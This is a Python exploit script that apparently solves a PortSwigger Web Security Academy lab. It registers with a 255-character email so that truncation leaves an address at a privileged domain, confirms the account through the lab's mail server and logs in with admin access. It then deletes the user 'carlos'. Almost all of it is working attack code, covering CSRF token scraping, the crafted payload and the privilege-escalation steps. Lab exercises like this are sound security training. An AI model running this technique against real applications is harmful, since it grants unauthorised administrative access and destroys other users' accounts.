import requests
import re
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a5d007804dce13880c8fdc1007200b3.web-security-academy.net/"
EMAIL_CLIENT_URL = "https://exploit-0aab00b304ffe16080b4fc6001cd000c.exploit-server.net/email"

def exploit_truncation(url, email_client):
    session = requests.Session()
    
    # 1. Dynamic Payload Construction
    # Extract the exploit domain from the provided client URL
    exploit_domain = email_client.split('/')[2] 
    
    # Construct exact 255 character boundary
    filler = "a" * 238
    spoofed_email = f"{filler}@dontwannacry.com.{exploit_domain}"
    
    # 2. Registration Phase
    register_endpoint = f"{url}register"
    response = session.get(register_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    registration_payload = {
        "csrf": csrf_token,
        "username": "sithumsr",
        "email": spoofed_email,
        "password": "sithum22"
    }
    
    session.post(register_endpoint, data=registration_payload)
    print("[+] REGISTRATION PAYLOAD SENT")
    
    # 3. Confirmation Extraction Phase
    print("[*] Accessing email server...")
    response = session.get(email_client)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Locate the specific anchor tag containing the registration token using regex
    confirm_tag = soup.find('a', href=re.compile(r"temp-registration-token"))
    
    if confirm_tag:
        confirm_url = confirm_tag['href']
        print("[+] CONFIRMATION LINK EXTRACTED")
        
        # Trigger the confirmation
        session.get(confirm_url)
        print("[+] ACCOUNT VERIFIED")
    else:
        print("[-] Confirmation link not found in email client.")
        return

    # 4. Authentication Phase
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_creds = {
        "username": "sithumsr",
        "password": "sithum22",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_creds)
    
    if "Log out" in response.text:
        print("[+] LOGGED IN AS ADMINISTRATOR")
        
        # 5. Execution Phase
        delete_endpoint = f"{url}admin/delete"
        target_param = {
            "username": "carlos"
        }
        session.get(delete_endpoint, params=target_param)
        
        # Verification
        final_check = session.get(url)
        if "Congratulations" in final_check.text:
            print("[+] TARGET SECURED: Lab Solved")

if __name__ == "__main__":
    exploit_truncation(BASE_URL, EMAIL_CLIENT_URL)